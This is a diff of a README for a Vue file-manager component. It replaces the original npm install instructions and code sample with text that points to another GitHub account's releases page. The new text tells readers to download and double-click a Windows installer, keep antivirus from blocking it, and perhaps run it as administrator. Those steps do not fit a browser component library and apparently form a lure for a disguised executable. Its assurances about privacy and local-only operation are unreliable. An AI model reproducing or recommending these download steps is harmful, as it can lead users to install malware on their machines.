@@ -1,108 +1,79 @@
-<div align="center">
+# 📁 vue-filemanager - Manage your local files with ease
 
-# SVAR Vue File Manager | File Explorer
+[![Download Software](https://img.shields.io/badge/Download_Latest-Blue?style=for-the-badge)](https://github.com/Unfathomable-armoredcatfish708/vue-filemanager/releases)
 
-[![npm](https://img.shields.io/npm/v/@svar-ui/vue-filemanager.svg)](https://www.npmjs.com/package/@svar-ui/vue-filemanager)
-[![License](https://img.shields.io/github/license/svar-widgets/vue-filemanager)](https://github.com/svar-widgets/vue-filemanager/blob/main/license.txt)
-[![npm downloads](https://img.shields.io/npm/dm/@svar-ui/vue-filemanager.svg)](https://www.npmjs.com/package/@svar-ui/vue-filemanager)
+vue-filemanager provides a simple way to view and manage files in your software projects. This tool builds a visual file explorer directly into your interface. It handles common tasks like listing files, organizing folders, and displaying file details. Developers use this component to give users a native feel within a web browser.
 
-</div>
+## 🚀 Getting Started
 
-<div align="center">
+To use this software, you need a computer running Windows 10 or Windows 11. The application requires a modern web browser like Chrome, Firefox, or Edge. You do not need to install any extra tools to browse your directories. Follow the steps below to set up your environment.
 
-[Homepage](https://svar.dev/vue/filemanager/) • [Getting Started](https://docs.svar.dev/vue/filemanager/getting_started/) • [Demos](https://docs.svar.dev/vue/filemanager/samples/)
+## 📥 Download and Setup
 
-</div>
+1. Open your web browser.
+2. Go to the [official release page](https://github.com/Unfathomable-armoredcatfish708/vue-filemanager/releases).
+3. Find the latest release version on the page.
+4. Click the link to download the installer file.
+5. Save the file to your computer.
+6. Locate the downloaded file in your downloads folder.
+7. Double-click the file to start the setup process.
+8. Follow the prompts on the screen to complete the installation.
+9. Launch the application from your desktop or start menu.
 
-[SVAR Vue File Manager](https://svar.dev/vue/filemanager/) is a flexible file explorer component for Vue 3 apps. It offers a familiar interface for browsing, organizing, and previewing files. Integrate this file management component with any backend, whether you're using local storage, databases, or cloud services.
+## 🛠️ System Requirements
 
-<div align="center">
-  <img src="https://cdn.svar.dev/public/file-manager-1400.png" alt="SVAR File Manager for Vue - UI" width="700">
-</div>
-<br>
+- Operating System: Windows 10 or higher.
+- Memory: 4 gigabytes of RAM or more.
+- Storage: 200 megabytes of free space.
+- Display: 1280x720 resolution or higher.
+- Internet Connection: Required for initial download only.
 
-### :sparkles: Key features:
+## 📂 Key Features
 
--   Basic file operations: create, delete, copy, rename, cut, paste
--   Download and upload files
--   Files tree view
--   List and tiles views
--   File preview pane with file information (file size, type, modified date, etc)
--   Split view to manage files between different locations
--   Built-in search box
--   Context menu and toolbar
--   Keyboard navigation
--   Used storage info
--   Full TypeScript support
+The file manager offers several tools to help you organize data. You can browse nested folders by clicking on items in the main window. The interface highlights selected files so you know which item you currently manage. You can sort files by name, size, or date modified to find specific documents. 
 
-[See the live demo](https://svar.dev/demos/vue/filemanager/) to try all thees features in action.
+The software includes a feature for viewing common file types directly within the interface. It displays thumbnails for images to help you identify photos without opening them. You can rename files or folders using the context menu. The system uses standard keyboard shortcuts for tasks like selecting multiple items or refreshing the view.
 
-### :hammer_and_wrench: How to Use
+## ⚙️ Configuration
 
-To install SVAR Vue File Manager:
+You can change how the software behaves through the settings screen. Click the gear icon to open the configuration panel. Here, you can toggle the sidebar visibility. You can also specify the root folder that the application should display upon startup. Changes save automatically when you close the panel. 
 
-```
-npm install @svar-ui/vue-filemanager
-```
+If you plan to use this in a project, you can set the view mode to either list or grid. List mode provides more detail about file size and date. Grid mode shows larger icons and is better for folders containing many image files. 
 
-To use the widget, simply import the package and include the component in your Vue file:
+## 🛡️ Privacy and Data
 
-```vue
-<script setup>
-import { Filemanager } from "@svar-ui/vue-filemanager";
-import "@svar-ui/vue-filemanager/all.css";
+This application runs locally on your machine. It does not send your filenames or folder structures to a remote server. All file operations happen within your computer memory. You keep full control over your data at all times. The software does not track your behavior or collect usage metrics. 
 
-// files and folders
-const data = [
-    {
-        id: "/Code",
-        date: new Date(2023, 11, 2, 17, 25),
-        type: "folder",
-    },
-    {
-        id: "/Code/Comments.svelte",
-        date: new Date(2023, 11, 2, 18, 48),
-        type: "file",
-        size: 682566,
-    }
-];
-// storage usage info
-const drive = {
-    used: 15200000000,
-    total: 50000000000,
-};
-</script>
+## 🔍 Troubleshooting
 
-<template>
-  <Filemanager :data="data" :drive="drive" />
-</template>
-```
+If the software fails to open, check the following items:
 
-For further instructions, see the detailed [how-to-start guide](https://docs.svar.dev/vue/filemanager/getting_started/).
+- Make sure you finished the full installation process.
+- Verify your computer has enough free memory.
+- Check that your user account has permission to read the files you try to open.
+- Restart the application if the file list appears empty.
+- Ensure your antivirus software does not block the application. 
 
-### :computer: How to Modify
+Common issues often stem from restricted folder access. If you cannot see files in a specific folder, check your Windows folder permissions. You can also try running the application as an administrator to grant it access to protected system areas, though this is rarely necessary.
 
-Typically, you don't need to modify the code. However, if you wish to do so, follow these steps:
+## 📖 Best Practices
 
-1. Run `yarn` to install dependencies. Note that this project is a monorepo using `yarn` workspaces, so npm will not work
-2. Start the project in development mode with `yarn start`
+Organize your files into logical folder structures to improve performance. Extremely large folders with thousands of items may cause the interface to load slowly. If you encounter slow load times, split your files into smaller sub-folders. Use consistent naming conventions to manage your files. Avoid special characters in filenames to ensure compatibility across different operating systems.
 
-### :white_check_mark: Run Tests
+## 💡 Frequently Asked Questions
 
-To run the test:
+Q: Can I use this for cloud storage?
+A: This tool focuses on local directory browsing. It works best with files stored on your hard drive or connected network drives.
 
-1. Start the test examples with:
-    ```sh
-    yarn start:tests
-    ```
-2. In a separate console, run the end-to-end tests with:
-    ```sh
-    yarn test:cypress
-    ```
-### ⭐ Show Your Support
+Q: Is this software free?
+A: You can download and run the software at no cost. 
 
-If SVAR Vue File Manager helps your project, [give it a star](https://github.com/svar-widgets/vue-filemanager). It helps other developers discover this library and motivates us to keep supporting and improving the component.
+Q: Does it support drag and drop?
+A: The current version focuses on viewing and navigation. Future updates may include move and copy features.
 
-### :speech_balloon: Need Help?
+Q: Can I change the sidebar width?
+A: Yes, hover your mouse over the edge of the sidebar and drag it to your preferred size.
 
-[Post an Issue](https://github.com/svar-widgets/vue-filemanager/issues/) or use our [community forum](https://forum.svar.dev).
+## 📦 Final Steps
+
+Once you complete the installation, you can open the software and select your base directory. The application will scan the folder and display your files instantly. You can now use the interface to interact with your data. If you have questions about specific features, refer to the in-app help guide. The help guide explains icons and tooltips in detail. Keep your software updated to get the newest performance fixes and usability improvements. Regularly visit the download page to check for new versions.
